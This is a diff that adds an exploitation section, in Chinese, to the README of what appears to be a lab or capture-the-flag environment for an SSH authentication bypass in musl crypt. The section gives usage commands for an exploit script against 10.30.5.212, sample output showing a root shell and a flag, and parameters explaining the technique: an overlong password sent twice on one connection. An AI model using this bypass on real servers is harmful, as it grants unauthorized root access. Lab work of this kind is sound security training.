@@ -121,6 +121,42 @@ docker restart musl-ssh-bypass
 ./verify.sh 127.0.0.1 2222      # 期望 failed
 ```
 
+## 利用
+
+`exploit/exp_104595.py` 是完整的利用脚本，能指定目标账户和要执行的命令：
+
+```bash
+python3 exploit/exp_104595.py 10.30.5.212
+python3 exploit/exp_104595.py 10.30.5.212 -p 2222 -c 'id; cat /root/flag.txt'
+python3 exploit/exp_104595.py 10.30.5.212 -u seed          # 换个目标账户
+```
+
+输出：
+
+```
+[*] target  root@10.30.5.212:22
+[*] payload 300 字节 × 2 次（同一连接）
+[+] 认证绕过成功（ssh 退出码 0）
+    （第一次尝试被拒是预期行为，第二次才通过）
+    uid=0(root) gid=0(root) groups=0(root),...
+    flag{musl_crypt_r3turns_st4r}
+```
+
+只依赖系统自带的 `ssh` 客户端，不装第三方库。脚本让 ssh 自己重试两次
+（`NumberOfPasswordPrompts=2`），保证两次密码落在同一个 TCP 连接上——
+连着跑两条 `ssh` 命令是打不通的。
+
+| 参数 | 说明 |
+|---|---|
+| `-p/--port` | SSH 端口，默认 22 |
+| `-u/--user` | 目标账户，默认 root |
+| `-c/--command` | 登录后执行的命令 |
+| `-l/--length` | 超长密码字节数，默认 300，必须 > 256 |
+| `-n/--tries` | 同一连接内的尝试次数，默认 2 |
+
+Windows 下没有 `setsid`，脚本会退回直接调用，可能拿不到「同一连接两次」的效果，
+建议在 WSL 或 Linux 里跑。
+
 ## 排查
 
 | 现象 | 原因 |
